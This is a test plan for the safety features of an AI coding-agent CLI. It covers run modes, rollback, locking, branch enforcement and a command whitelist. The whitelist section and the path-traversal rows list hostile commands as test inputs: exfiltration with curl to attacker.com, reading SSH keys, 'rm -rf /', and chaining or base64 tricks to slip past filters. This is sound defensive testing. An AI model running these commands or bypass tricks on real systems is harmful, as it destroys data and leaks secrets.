| AB-181 | Roadmap goal triggering MULTIPLE Tier 2 skills at once (e.g. "pandas dataframe optimization for routing") | Both `cudf.md` and `cuopt-routing.md`/`cuopt-optimization.md` load together correctly | P1 |
| AB-182 | Keyword detection for Tier 2 — false positive check: does "training a new employee" accidentally trigger `nemotron-customize.md`/`neautomodel-recipe.md` (training keyword) | Keyword matching has enough context-awareness to avoid obviously wrong triggers, or this is a documented known limitation | P2 |
| AB-183 | Tier 2 skill file missing on disk when its trigger fires | Clear error, not silent prompt gap | P0 |
| AB-184 | Tier 2 skills don't load for unrelated clusters even if keyword is present (e.g. "quantum" mentioned in a Jazz/UI task) | Conditional loading still respects cluster scoping, not just global keyword match | P1 |

## 14. `autobots run --supervised`

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-185 | Run with a complete roadmap, approve every phase | Each phase pauses for explicit approval before proceeding to the next | P0 |
| AB-186 | At an approval prompt, reject/decline a phase | Run halts cleanly without partially applying that phase's changes | P0 |
| AB-187 | At an approval prompt, request to see the diff before approving | Diff is shown clearly (file-by-file), not just a vague "phase 3 ready" message | P0 |
| AB-188 | Approve a phase, then Ctrl+C during the actual file-write step | No half-written files; either fully applied or fully rolled back, never a torn write | P0 |
| AB-189 | Run supervised with zero context files present (bypassing init somehow) | Hard-blocked from running, consistent with `autobots init` requirements | P0 |
| AB-190 | Run supervised on a roadmap where phase 2 depends on phase 1, but phase 1 is rejected | Phase 2 is not offered for approval / is marked blocked, not silently attempted anyway | P0 |
| AB-191 | Run supervised, approve a phase, inspect actual files written vs what the diff preview showed | Diff preview exactly matches what gets written — no last-second drift | P0 |
| AB-192 | Supervised run interrupted by terminal closing (SIGHUP) mid-approval-wait | State is checkpointed at the last completed phase, resumable via `autobots resume` | P0 |
| AB-193 | Approval prompt response handling for invalid input (typing "maybe" instead of y/n) | Re-prompts cleanly, doesn't crash or default to either approve or reject silently | P1 |
| AB-194 | Run supervised against a roadmap with 1 single phase | Works correctly for the trivial case, not just multi-phase | P1 |
| AB-195 | Run supervised, approve a phase that the model itself flags low confidence on (if such signaling exists) | Low-confidence phases are surfaced distinctly to the approver | P2 |
| AB-196 | Time-to-first-approval-prompt on a typical small task | Reasonably fast (this is the "first impression" moment — should not feel like Claude Code/OpenCode is faster by a mile) | P1 |
| AB-197 | Run supervised twice on the identical roadmap+context (determinism check at low temperature) | Reasonably consistent results, not wildly divergent outputs each time | P2 |
| AB-198 | Supervised run where a phase's generated code references a function from a LATER, not-yet-executed phase | Either the planning step prevents this ordering issue, or execution handles forward references gracefully | P1 |
| AB-199 | Approve all phases successfully through to completion | `progress-tracker.md` correctly shows 100% complete, matches `autobots status` | P0 |
| AB-200 | Run supervised on a roadmap referencing a file that was manually deleted by the user between `plan` and `run` | Clear error about the missing target file, not a confusing write failure | P1 |
| AB-201 | Compare the supervised approval UX directly against Claude Code's permission-prompt UX | Information density and clarity of "what am I approving" should be at parity, not a regression | P0 |
| AB-202 | Approve a phase, then the validation step (Section 17) fails immediately after — confirm the approved-but-failed state is communicated clearly | User isn't left wondering whether their approval "worked" | P1 |

## 15. `autobots run --milestone`

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-203 | `milestone_threshold = 3`, roadmap has 9 phases | Approval prompts occur after phase 3, 6, and 9 — verify exact cadence | P0 |
| AB-204 | `milestone_threshold = 3`, roadmap has only 2 phases total | Single approval at the end (or none needed beyond final), no crash from threshold exceeding total phases | P1 |
| AB-205 | Reject at a milestone checkpoint after 3 phases already auto-completed | Confirm whether reject rolls back all 3 phases in that milestone batch or just halts going forward — and that this is documented either way | P0 |
| AB-206 | `--milestone` flag combined with a CLI-overridden threshold (if supported, e.g. `--milestone --threshold 5`) | CLI override takes precedence over config file value | P1 |
| AB-207 | Milestone run interrupted mid-batch (phase 2 of a 3-phase milestone batch) | Resume picks up correctly mid-batch, not from the start of the batch or the whole run | P0 |
| AB-208 | Milestone diff review at the checkpoint shows ALL phases in that batch, not just the last one | Full batch diff visibility before approving | P0 |
| AB-209 | Milestone mode with `milestone_threshold = 1` | Behaves identically to supervised mode | P2 |
| AB-210 | Milestone mode with `milestone_threshold` larger than total phase count | Behaves identically to autonomous mode for that run (single final gate) — confirm this is intentional | P2 |
| AB-211 | Validation failure occurs on phase 2 of a 3-phase milestone batch, before the checkpoint | Repair loop (Section 17) engages before reaching the milestone approval, not bypassed | P0 |
| AB-212 | Cost/stats accuracy for milestone runs vs supervised — `autobots stats` after a milestone run | Cost tracking is accurate per-phase even though approval is batched | P1 |

## 16. `autobots run --autonomous`

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-213 | Full autonomous run on a well-scoped, well-tested roadmap | Completes all phases with zero human intervention, ends in a clean state matching `progress-tracker.md` | P0 |
| AB-214 | Autonomous run where phase 4 of 10 fails validation 3+ times (max_verification_attempts exceeded) | Stops cleanly, reports exactly which phase and why, doesn't silently skip and continue to phase 5 | P0 |
| AB-215 | Autonomous run on a roadmap that would delete/overwrite an existing file with no acceptance criteria checking content preservation | Confirm there's still SOME guardrail (snapshot before write per README) even with zero human gates | P0 |
| AB-216 | Kill the process (`kill -9`) mid-autonomous-run | No corrupted git state, no half-written files outside of what snapshots can roll back | P0 |
| AB-217 | Autonomous run against a roadmap targeting files outside the project root (path traversal in a phase definition, e.g. `../../etc/passwd`) | Blocked by workspace safety (cross-reference Section 19), never writes outside project root regardless of autonomy level | P0 |
| AB-218 | Autonomous run cost — compare actual `autobots stats` cost against the upfront estimate (if any) | No order-of-magnitude surprise bills | P0 |
| AB-219 | Long-running autonomous run (1hr+, 20+ phases) — memory/resource usage over time | No unbounded memory growth (audit trail, context accumulation) over a long run | P1 |
| AB-220 | Autonomous run where the safety branch check fails partway (user switched branches manually mid-run in another terminal) | Detected and run halts safely rather than committing to the wrong branch | P0 |
| AB-221 | Autonomous run git auto-commit behavior — verify commits are made per-phase with meaningful messages, not one giant squashed commit at the end with no granularity | Commit granularity allows `git bisect`/review of individual phases | P1 |
| AB-222 | Two autonomous runs targeting the same project started in two separate terminals simultaneously | Workspace locking (Section 19) prevents this, doesn't corrupt state with concurrent writes | P0 |
| AB-223 | Autonomous run where a generated phase tries to run a genuinely destructive command (`rm -rf`, `DROP TABLE`) as part of "validation commands" | Blocked by the command policy whitelist (Section 23) even in fully autonomous mode | P0 |
| AB-224 | Compare time-to-completion of autonomous mode against doing the same task manually with Claude Code/OpenCode's auto-accept mode | Should be competitive, not dramatically slower for equivalent scope | P1 |
| AB-225 | Autonomous run that completes successfully — confirm test suite (if testing-strategy.md defines one) actually passes at the end, not just that "validation commands" ran without erroring | Real green test suite, not just "the linter didn't crash" | P0 |
| AB-226 | Autonomous mode explicitly disabled via config (if such a hard-lock exists) but `--autonomous` flag passed anyway | Config-level lock (if it exists) takes precedence over CLI flag, or the absence of this safety feature is a known documented gap | P2 |

## 17. Validation, Repair & Retry Loops

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-227 | Validation command (e.g. `pytest`) fails after a phase's code is written | Ratchet repair cluster engages automatically per the architecture | P0 |
| AB-228 | Repair loop fixes the issue on attempt 1 | Re-validation passes, phase marked complete, attempt count logged | P0 |
| AB-229 | Repair loop fails repeatedly up to `max_verification_attempts` (default 3) | Stops at exactly the configured limit, doesn't loop forever or silently exceed it | P0 |
| AB-230 | Repair loop exhausts attempts — confirm the partially-broken state is rolled back via snapshot, not left in a broken half-fixed state | Project returns to last-known-good state | P0 |
| AB-231 | Validation command itself is misconfigured (typo in `testing-strategy.md`, e.g. `pytest` vs `pytests`) | Clear "command not found" surfaced distinctly from an actual test failure | P0 |
| AB-232 | Validation command times out (hangs, e.g. a test with an infinite loop) | Timeout enforced, doesn't hang the entire run indefinitely | P0 |
| AB-233 | Repair attempt 2 introduces a NEW, different failure than attempt 1 had | Repair loop correctly evaluates against the latest failure, not stale state from attempt 1 | P1 |
| AB-234 | Validation passes but with warnings (e.g. linter warnings, not errors) | Documented behavior on warnings-vs-errors distinction — confirm warnings don't block completion if not configured to | P1 |
| AB-235 | Repair loop's generated fix is reviewed by RedAlert (security) before being accepted, per architecture | Confirm repair fixes go through the same security review as original generation, not a bypass shortcut | P0 |
| AB-236 | Validation runs multiple commands (test + lint + build) where only ONE fails | Repair loop targets the actual failing command's output, not a vague "something failed" | P1 |
| AB-237 | Repair loop cost — verify each retry attempt is tracked separately in `autobots stats`, not hidden/merged into the original phase cost | Full cost transparency across retries | P1 |
| AB-238 | Flaky test causes validation to fail on attempt 1 but pass on attempt 2 with NO code changes made by repair (pure flakiness) | Confirm the system doesn't claim credit for "fixing" something that was never broken — or at minimum this edge case is understood | P2 |
| AB-239 | Validation command requires environment setup (e.g. a database needs to be running) that isn't present | Clear environment-precondition error, distinguished from a code defect | P1 |
| AB-240 | Repair loop on a phase that legitimately has conflicting acceptance criteria (impossible to satisfy both) | Exhausts attempts and surfaces this clearly rather than the model silently picking one criterion and ignoring the other without telling the user | P1 |
| AB-241 | `autobots gate` (Section 38) run standalone vs validation-as-part-of-run — confirm they use the same underlying validation logic, not two divergent implementations | Consistent pass/fail results between the two entry points | P1 |
| AB-242 | Validation step explicitly tests file existence/non-corruption after write (basic sanity), separate from project-level test suite | Confirms at minimum that "the file is syntactically valid" before declaring success | P0 |
| AB-243 | Repair loop given a validation failure with a massive stack trace (10k+ characters) | Trace is truncated/summarized sensibly for the repair prompt, not blindly dumped causing context overflow | P1 |
| AB-244 | End-to-end: intentionally seed a roadmap with a phase that WILL fail validation (e.g. ask for an impossible feature), run autonomous, observe the full repair-then-rollback cycle | Entire flow behaves exactly as documented from failure → repair attempts → rollback → clear final report | P0 |

## 18. Multi-Root File Writing

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-245 | Phase writes files across `src/`, `tests/`, and `docs/` in a single phase | All three roots receive correct files in one atomic-feeling operation | P0 |
| AB-246 | Phase attempts to write to a root NOT in the allowed list (e.g. `node_modules/`, `.git/`) | Blocked — multi-root writing has an implicit allowlist (`src/`, `app/`, `lib/`, `tests/`, `docs/`, `scripts/`) that's enforced, not just suggested | P0 |
| AB-247 | Project structure doesn't use any of the standard root names (e.g. everything lives under `backend/` and `frontend/` instead) | Either configurable custom roots exist, or this is a real limitation that needs README disclosure | P0 |
| AB-248 | Phase writes a NEW file vs MODIFIES an existing file in the same root | Both cases handled correctly, with modify preserving unrelated existing content in that file | P0 |
| AB-249 | Phase write fails partway (disk full simulated, or permission revoked mid-write) across multiple roots | Either all roots roll back together or partial-write state is clearly flagged as inconsistent, never silently accepted as "phase complete" | P0 |
| AB-250 | File path within an allowed root attempts traversal (`src/../../../etc/passwd`) | Path normalization catches and blocks this before any write occurs | P0 |
| AB-251 | Symlinked root directory (e.g. `tests/` is a symlink to outside the project) | Either followed safely within project boundary checks or explicitly rejected | P1 |
| AB-252 | Very long file paths (Windows MAX_PATH considerations, 260+ chars) | No silent truncation or failure on Windows specifically | P1 |
| AB-253 | Binary file writes (e.g. a phase generates a small PNG asset) within an allowed root | Handled correctly, not corrupted by text-mode line-ending conversion | P2 |
| AB-254 | Filename collision — phase tries to create a file that already exists with different intended content than what's there | Conflict is detected and surfaced rather than silently overwritten without snapshot | P0 |

## 19. Workspace Safety & Locking

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-255 | Two `autobots run` invocations against the same project directory simultaneously | Second invocation detects the lock and refuses to start, with a clear message | P0 |
| AB-256 | Lock file left behind after a hard crash (`kill -9`) — next run attempt | Either stale-lock detection (e.g. PID check) auto-recovers, or a clear manual-unlock instruction is given — never an indefinite false "still running" block | P0 |
| AB-257 | Lock acquired, then the locking process legitimately finishes — confirm lock is released immediately, not after some delay | Next run can start right away | P0 |
| AB-258 | Workspace safety check on a project root that's actually a symlink to another location | Resolves correctly, doesn't get confused about what's "inside" the workspace boundary | P1 |
| AB-259 | Run targeting a path that is a parent directory of another active autobots project | No accidental cross-project interference | P1 |
| AB-260 | Lock file location — confirm it's project-local (not global), so two DIFFERENT projects can run autobots simultaneously without interference | Two unrelated projects run fine at the same time | P0 |
| AB-261 | Manually delete the lock file while a run is genuinely still active, then start a second run | Document what happens — ideally still some protection (e.g. PID-based detection independent of the lock file itself) | P1 |
| AB-262 | Workspace safety check timing — does it lock BEFORE or AFTER context files are read | Locking happens before any mutation-capable step, not after | P1 |
| AB-263 | Run `autobots status` or `autobots logs` (read-only commands) while a write-lock is held by another run | Read-only commands are NOT blocked by the write lock | P1 |
| AB-264 | Confirm the workspace boundary genuinely prevents ANY write outside the project root regardless of which command/cluster triggers it (cross-check against AB-217, AB-250) | Single consistent boundary enforcement point, not duplicated/inconsistent logic across different write paths | P0 |

## 20. Snapshot, Rollback & `autobots undo`

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-265 | Snapshot is taken before EVERY write, per README | Verify via `autobots snapshots` that a snapshot exists before each phase, not just the first one | P0 |
| AB-266 | `autobots undo` after a single completed phase | Exactly reverts that phase's file changes, nothing more, nothing less | P0 |
| AB-267 | `autobots undo` called multiple times in a row (undo, undo, undo) | Steps back through history correctly one snapshot at a time, doesn't skip or repeat | P0 |
| AB-268 | `autobots undo` with NO snapshots available (fresh project, nothing run yet) | Clear "nothing to undo" message, not a crash | P1 |
| AB-269 | `autobots undo` after manually editing files outside of autobots between the snapshot and the undo call | Conflict is detected — undo doesn't blindly overwrite the user's manual edits without warning | P0 |
| AB-270 | `autobots snapshots` lists all available snapshots with timestamps and associated phase IDs | Output is genuinely useful for deciding what to roll back to | P1 |
| AB-271 | `autobots diff` against a specific snapshot (not just the latest) | Correctly computes diff against the specified historical point | P0 |
| AB-272 | Snapshot storage size growth over a long project history (50+ phases) | Reasonable disk usage, ideally with some pruning/compaction strategy documented | P1 |
| AB-273 | `autobots undo` on binary files (images, etc.) | Restores byte-for-byte correctly, not corrupted by any text-based diffing assumption | P1 |
| AB-274 | Snapshot/undo interaction with git — does undo also need a separate `git revert`, or are they unified | Documented and consistent relationship between autobots snapshots and git history (cross-ref Section 37) | P0 |
| AB-275 | `autobots undo` mid-run is blocked (can't undo while a run is actively writing) | Workspace lock (Section 19) prevents undo during active execution | P0 |
| AB-276 | Rollback triggered automatically by repair-loop exhaustion (AB-230) produces an IDENTICAL result to manually running `autobots undo` for that phase | Automatic and manual rollback paths are consistent, not divergent implementations | P1 |
| AB-277 | Snapshot taken of a very large binary asset (e.g. 500MB file accidentally in the repo) | Doesn't blow up disk usage or crash the snapshot mechanism — at minimum, a size warning | P2 |
| AB-278 | `autobots undo` exit code and confirmation message clarity | User can tell with certainty whether the undo succeeded before doing anything else | P1 |

## 21. Session Management / `autobots resume` / Checkpoints

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-279 | Crash mid-phase (kill process), then `autobots resume` | Picks up exactly where it left off — does NOT re-run already-completed phases | P0 |
| AB-280 | Crash mid-WRITE within a phase (not between phases), then resume | Confirm the in-progress phase is treated as failed/incomplete and either retried cleanly or rolled back first, never resumed from a torn mid-write state | P0 |
| AB-281 | `autobots resume` with no prior session/checkpoint at all | Clear "nothing to resume, use `autobots run` to start fresh" message (matches documented troubleshooting) | P0 |
| AB-282 | Resume a session days/weeks later (laptop closed, reopened) | Checkpoint data survives across machine sleep/restart with no time-based expiry breaking it unexpectedly | P0 |
| AB-283 | Resume after the project's `context/` files were edited since the crash | Documented behavior — does resume use the OLD context snapshot from when the run started, or the NEW current files | P1 |
| AB-284 | Resume after switching git branches since the crash | Safety branch check (Section 22) catches this before resuming on the wrong branch | P0 |
| AB-285 | Resume after the API key changed/rotated since the crash | Works fine with the new key, no stale-credential issue | P1 |
| AB-286 | Two different sessions exist (e.g. one from a `--supervised` run, one from a different `--autonomous` attempt) — does resume correctly pick the most recent/relevant one | No ambiguity about WHICH session is being resumed | P1 |
| AB-287 | Resume after manually deleting the checkpoint file directly (not the lock, the actual session state) | Clear "checkpoint corrupted/missing" rather than resuming from a wrong/default state silently | P0 |
| AB-288 | Checkpoint data includes enough audit context that `autobots explain` works correctly even for phases completed in a PREVIOUS (crashed) session, not just the current one | Full audit trail continuity across resume | P1 |
| AB-289 | Resume on a DIFFERENT machine than where the run started (checkpoint committed to git, cloned elsewhere) | Document whether this is supported; if checkpoints are local-only, this should fail with a clear message, not silent wrong behavior | P1 |
| AB-290 | Compare this resume experience directly against Claude Code/OpenCode's session resume — does autobots survive the exact same crash scenarios they handle (terminal closed, laptop sleep, network drop) | Should be at genuine parity — this is one of the most-used reliability features of both reference tools | P0 |
| AB-291 | `autobots resume` mid-resume itself gets interrupted (double crash scenario) | Doesn't compound into unrecoverable state — still resumable a third time | P1 |
| AB-292 | Resume correctly re-acquires the workspace lock (Section 19) rather than assuming it's still held | No race where two resumed sessions both think they own the lock | P0 |

## 22. Safety Branch Enforcement

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-293 | `autobots run` on `main`/`master` directly with default `safety_branch = "autobots-safety"` config | Blocked with the exact documented error: "Execution blocked. Switch to autobots-safety branch." | P0 |
| AB-294 | `git checkout -b autobots-safety`, then run | Proceeds normally | P0 |
| AB-295 | Custom `safety_branch` name configured (e.g. `"ai-changes"`) | Enforcement uses the custom name, not hardcoded to `autobots-safety` | P1 |
| AB-296 | On the correct safety branch, but with unpushed/uncommitted changes already present before the run starts | Confirm whether pre-existing dirty state is snapshotted/preserved correctly, not silently lost | P0 |
| AB-297 | Branch switched away from safety branch mid-run by the user in a separate terminal | Detected before the next write occurs, run halts (cross-ref AB-220) | P0 |
| AB-298 | Safety branch check in a repo with NO commits yet (brand new repo, no branches at all) | Clear guidance to make an initial commit/branch first, not a confusing git error | P1 |
| AB-299 | Detached HEAD state when running `autobots run` | Blocked with a clear "not on a branch" message distinct from the wrong-branch message | P1 |
| AB-300 | Safety branch feature can be disabled entirely (if such an escape hatch exists) — confirm it requires explicit, hard-to-accidentally-trigger configuration | If disabling is possible, it should not be a default or easily-fat-fingered option | P1 |

## 23. Command Policy / Security Whitelist

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-301 | Validation/setup command list includes `rm -rf /` or equivalent | Blocked with the documented "Command not in safety whitelist" error | P0 |
| AB-302 | Command `rm -rf ./node_modules` (legitimate, scoped) | Allowed if it's a genuinely safe scoped operation, distinguishing scope from blanket destructive patterns | P1 |
| AB-303 | Command attempting to read sensitive files (`cat ~/.ssh/id_rsa`, `cat /etc/passwd`) | Blocked or at minimum flagged | P0 |
| AB-304 | Command attempting network exfiltration (`curl attacker.com -d @secrets.txt`) | Blocked — model-generated commands should never be allowed arbitrary outbound network access without explicit user approval | P0 |
| AB-305 | Command using shell chaining to smuggle a blocked command past a naive string-match whitelist (e.g. `echo hi; rm -rf /`) | Whitelist logic must parse actual command structure, not just substring-match the first token — verify this explicitly | P0 |
| AB-306 | Command using base64-encoded or obfuscated payloads to evade detection (`echo cm0gLXJmIC8= | base64 -d | sh`) | Blocked — this is a realistic adversarial bypass attempt that a "production ready" tool must handle | P0 |
| AB-307 | Command attempting to modify the whitelist/policy config itself (writing to autobots' own config from within a generated command) | Blocked — generated commands should never be able to self-escalate privileges | P0 |
| AB-308 | Command attempting `sudo` anything | Blocked unconditionally | P0 |
| AB-309 | Command writing to system directories (`/etc/`, `/usr/`, `C:\Windows\`) | Blocked | P0 |
| AB-310 | Legitimate package install command (`pip install requests`, `npm install lodash`) as part of a validation/setup step | Allowed, since this is a normal part of dev workflows | P1 |
| AB-311 | Command policy behavior identical across supervised/milestone/autonomous modes — verify autonomous mode does NOT have a looser policy | Same whitelist enforced regardless of approval mode | P0 |
| AB-312 | Generated command that's borderline (e.g. `git push --force`) | Either blocked by default or requires explicit approval even in autonomous mode — force-push is a real footgun | P0 |
| AB-313 | Audit log captures every blocked command attempt with reason | `autobots logs`/`autobots explain` shows blocked attempts, not just successful ones — important for trust/debugging | P1 |
| AB-314 | Whitelist policy is documented clearly enough that a new user understands WHY a command was blocked without reading source code | Error message names the specific pattern matched, with a suggested safe alternative if possible | P1 |

## 24. `autobots status`

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-315 | `autobots status` on a fresh, never-run project | Clear "no run history" state, not an empty/blank confusing output | P1 |
| AB-316 | `autobots status` mid-run (in another terminal while a run is active) | Shows live/current progress accurately, not stale cached data | P0 |
| AB-317 | `autobots status` progress bar accuracy — compare against actual `progress-tracker.md` phase count | Numbers match exactly | P0 |
| AB-318 | `autobots status` after a run that ended in failure/rollback | Clearly shows failed state, not misleadingly showing as "complete" or "in progress" forever | P0 |
| AB-319 | `autobots status` branch info display | Shows the actual current git branch correctly | P1 |
| AB-320 | `autobots status` estimated time remaining (if shown) | Reasonably accurate based on actual phase timing history, not a static guess | P2 |
| AB-321 | `autobots status` output in a non-TTY context (CI pipeline) | Degrades to plain text, no broken progress-bar ANSI escape codes in logs | P1 |
| AB-322 | `autobots status --json` (if supported) for scripting | Valid parseable JSON | P2 |

## 25. `autobots explain` / Audit Trail

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-323 | `autobots explain P2-T3` on a real completed task ID | Shows full audit trail: what was planned, what model/cluster handled it, what was written, validation results | P0 |
| AB-324 | `autobots explain` with an invalid/nonexistent task ID | Clear "task ID not found" error, not a crash or empty silent output | P1 |
| AB-325 | `autobots explain` on a task that went through multiple repair attempts | Shows ALL attempts, not just the final successful one — full history matters for trust | P0 |
| AB-326 | `autobots explain` on a task that was rolled back | Shows the rollback event clearly in the trail | P1 |
| AB-327 | `autobots explain` output includes actual prompt sent to the model (or a reasonable summary) when `--verbose` equivalent is requested | Genuine transparency into what the AI was told, matching the "trust but verify" bar Claude Code/OpenCode users expect | P1 |
| AB-328 | `autobots explain` performance on a project with hundreds of completed tasks | Fast lookup, not a full linear scan that takes seconds | P2 |
| AB-329 | `autobots explain` cost breakdown for that specific task | Matches the per-task entry in `autobots stats` | P1 |
| AB-330 | `autobots explain` after a resumed/crashed session (cross-ref AB-288) | Trail is complete across the crash boundary, no gap | P1 |

## 26. `autobots stats` / Cost Tracking

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-331 | `autobots stats` after a completed run | Shows totals, per-phase averages, and total cost | P0 |
| AB-332 | Manually sum the individual phase costs and compare to the reported total | Numbers reconcile exactly, no silent rounding drift | P0 |
| AB-333 | `autobots stats` cost calculation accuracy against actual NVIDIA NIM pricing for the models used | Within a reasonable margin of the real bill — this is money, it needs to be trustworthy | P0 |
| AB-334 | `autobots stats` across multiple separate runs on the same project (cumulative vs per-run) | Clear distinction between "this run" and "all-time" stats | P1 |
| AB-335 | `autobots stats` including repair-loop retry costs (cross-ref AB-237) | Retries are counted, not silently excluded making the tool look cheaper than it is | P0 |
| AB-336 | `autobots stats` for a project with zero runs | Clean "no data yet" rather than a divide-by-zero crash | P1 |
| AB-337 | `autobots stats --json` or export option for budgeting/reporting purposes | Available and accurate if supported | P2 |
| AB-338 | Cost estimate shown BEFORE a run (if any, in `plan` or `run` preview) vs actual `stats` after | Estimate is close enough to be useful for budget decisions, flagged clearly as an estimate | P1 |

## 27. `autobots logs`

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-339 | `autobots logs` shows full audit trail chronologically | Readable, accurate timeline of all actions taken | P0 |
| AB-340 | `autobots logs` with a `--tail`/`-n` style flag (if supported) | Limits output correctly | P2 |
| AB-341 | `autobots logs` for a project with no activity yet | Clean empty state message | P1 |
| AB-342 | `autobots logs` never leaks API keys/secrets (cross-ref AB-030) | Confirmed redacted | P0 |
| AB-343 | `autobots logs` searchable/filterable by phase ID or cluster (if supported) | Works as documented | P2 |
| AB-344 | `autobots logs` file size/rotation on a very long-lived project | Doesn't grow unbounded without any rotation/archival strategy | P2 |

## 28. `autobots doctor` Preflight

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-345 | `autobots doctor` on a fully healthy setup | All checks pass with green confirmation, fast | P0 |
| AB-346 | `autobots doctor` checks API connectivity specifically (not just key presence) | Actually pings/validates the key works, doesn't just check it's a non-empty string | P0 |
| AB-347 | `autobots doctor` checks git repo status | Confirms repo exists, on correct branch state | P0 |
| AB-348 | `autobots doctor` checks config validity | Surfaces TOML errors here too (overlap with `config validate`, confirm consistent results between the two commands) | P1 |
| AB-349 | `autobots doctor` checks dependency versions (Python version, required packages) | Flags any version mismatches clearly | P1 |
| AB-350 | `autobots doctor` with MULTIPLE simultaneous problems (no key + wrong branch + bad config) | Lists ALL problems at once, not just the first one found (so the user doesn't have to run doctor 3 times to find all 3 issues) | P0 |
| AB-351 | `autobots doctor --fix` (if an auto-fix mode exists) | Safely fixes only what's safely fixable (e.g. creating `.gitignore` entry), never auto-fixes something destructive without confirmation | P1 |
| AB-352 | `autobots doctor` exit code reflects pass/fail for CI use | Correct exit codes | P1 |
| AB-353 | `autobots doctor` run time | Fast enough to run habitually before every session (this is the "is everything okay" check users will run reflexively, like `git status`) | P1 |
| AB-354 | `autobots doctor` checks disk space availability for snapshots | Warns if disk space is critically low before a run that will create many snapshots | P2 |
| AB-355 | `autobots doctor` checks for stale lock files (cross-ref AB-256) and offers guidance | Proactively surfaces this common gotcha rather than making the user discover it via a failed run | P1 |
| AB-356 | Compare `autobots doctor` thoroughness directly against `claude doctor` / OpenCode's equivalent health check | Should cover an equal or greater surface area of "things that silently break a session" | P1 |

## 29. `autobots config validate`

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-357 | Valid config | Passes cleanly | P0 |
| AB-358 | Config with a typo'd key name (e.g. `tempurature` instead of `temperature`) | Flagged as an unrecognized key, not silently ignored (silent ignoring is how users end up confused why a setting "isn't working") | P0 |
| AB-359 | Config with correct keys but wrong value TYPES (e.g. `max_tokens = "four thousand"` as a string) | Type validation error with the expected type named | P0 |
| AB-360 | Config validate run standalone vs config validation that happens automatically at the start of `autobots run` | Same validation logic, consistent results (no case where `config validate` passes but `run` immediately fails on a config issue, or vice versa) | P0 |
| AB-361 | Empty config file (0 bytes) | Treated as "use all defaults," not an error | P1 |
| AB-362 | Config validate exit code | Correct for CI/pre-commit hook usage | P1 |
| AB-363 | Config with deprecated keys from an older autobots version | Clear deprecation warning with migration guidance, not silent ignore or hard failure | P1 |
| AB-364 | Config validate output format is consistent/parseable enough to use in a pre-commit hook | Usable in automation, not just human-readable prose | P2 |

## 30. Shell Completions

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-365 | `autobots completions bash` generates a valid completion script | Sourcing it enables `autobots <TAB>` completion in bash | P1 |
| AB-366 | `autobots completions zsh` | Same for zsh | P1 |
| AB-367 | `autobots completions fish` | Same for fish | P1 |
| AB-368 | Completions cover subcommand flags too (e.g. `autobots run --<TAB>` suggests `--supervised`, `--milestone`, `--autonomous`, `--verbose`) | Flag-level completion works, not just top-level command names | P2 |
| AB-369 | Completions stay in sync after a version upgrade (regenerate and diff against old) | No stale completions suggesting removed/renamed commands | P2 |
| AB-370 | README/doctor mentions HOW to install completions (source location, shell config line to add) | First-time setup instructions exist and are accurate | P1 |

## 31. Context Budget Management

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-371 | Context (project files + roadmap + skills) approaching the target model's context limit | Warning issued before the call is made, not after an API rejection | P0 |
| AB-372 | Context exceeding the limit | Truncation occurs with a CLEAR indication of what was cut and why, not silent invisible truncation that could cause the model to act on incomplete information | P0 |
| AB-373 | Truncation strategy — confirm it drops the LEAST relevant content first (e.g. trims a huge architecture.md before dropping the actual task instructions) | Sensible priority order, verified by inspecting `--verbose` prompt output before/after truncation kicks in | P0 |
| AB-374 | Different models in different clusters have different context limits — budget management adapts per-model, not a single hardcoded limit applied everywhere | Verify across at least 2 clusters with known different limits | P1 |
| AB-375 | Context budget warning appears in `autobots plan` BEFORE committing to a roadmap that will definitely blow the budget at execution time | Proactive warning at planning time, not just a surprise failure during run | P1 |
| AB-376 | Extremely small task with minimal context still includes mandatory Tier 1 skills — confirm this doesn't itself trigger unnecessary truncation warnings on trivial tasks | No false-positive budget warnings for normal-sized tasks | P2 |
| AB-377 | Context budget calculation accounts for the MODEL'S response token reservation too (not just input) | `max_tokens` reserved space is subtracted correctly from available input budget | P1 |
| AB-378 | Budget management behavior is configurable/overridable (if at all) for advanced users who want to force a larger context at the cost of more truncation risk | If no override exists, confirm that's an acceptable, documented constraint | P2 |
| AB-379 | Multi-file diff context (when reviewing a large multi-file phase) under budget pressure | Diffs are summarized sensibly rather than the whole review silently failing | P1 |
| AB-380 | Compare context-budget handling directly against how Claude Code/OpenCode handle large-repo context windows | Should not regress UX — those tools are explicitly designed not to silently drop relevant context without telling the user | P0 |

## 32. Plugin System

| ID | Test Case | Expected Result | Priority |
|----|-----------|------------------|----------|
| AB-381 | Register a simple "before" hook (e.g. logs a message before each phase) | Hook fires reliably at the correct point in the lifecycle | P0 |
| AB-382 | Register an "after" hook | Fires reliably after phase completion | P0 |
| AB-383 | Plugin hook throws an exception | Run continues gracefully (or fails clearly, documented either way) rather than the plugin crash taking down the entire run silently with a confusing error | P0 |
| AB-384 | Plugin hook attempts a slow/blocking operation (e.g. network call with no timeout) | Doesn't hang the entire run indefinitely — some timeout protection exists | P1 |
| AB-385 | Multiple plugins registered, both hooking the same event | Execute in a defined, documented order | P1 |
| AB-386 | Plugin hook attempts to modify the in-flight phase data (if the API allows it) | Documented whether mutation is supported/safe, or hooks are strictly read-only/observational | P1 |
| AB-387 | Plugin loading from a malformed/broken plugin file | Clear error identifying which plugin failed to load, doesn't block ALL plugins or the whole CLI from starting | P0 |
